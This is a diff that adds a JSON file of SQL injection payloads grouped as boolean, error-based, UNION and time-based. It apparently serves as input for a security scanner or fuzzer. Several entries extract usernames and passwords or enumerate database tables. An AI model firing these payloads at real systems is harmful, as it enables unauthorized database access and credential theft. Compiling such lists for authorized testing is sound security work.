@@ -1,0 +1,29 @@
+{
+  "boolean": [
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' AND '1'='2",
+    "\" AND \"1\"=\"2",
+    "' OR 1=1--",
+    "' OR 'x'='x"
+  ],
+  "error": [
+    "' OR 1=CONVERT(int,'test')--",
+    "\" OR 1=CAST('test' AS INT)--",
+    "'||utl_inaddr.get_host_name||'",
+    "'|| (SELECT 1/(SELECT 0 FROM dual)) ||'"
+  ],
+  "union": [
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT username,password FROM users--",
+    "\" UNION SELECT username,password FROM users--",
+    "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+  ],
+  "time": [
+    "' OR SLEEP(5)--",
+    "' OR 'a'='a' AND SLEEP(5)--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "' || pg_sleep(5)--",
+    "\" || pg_sleep(5)--"
+  ]
+}
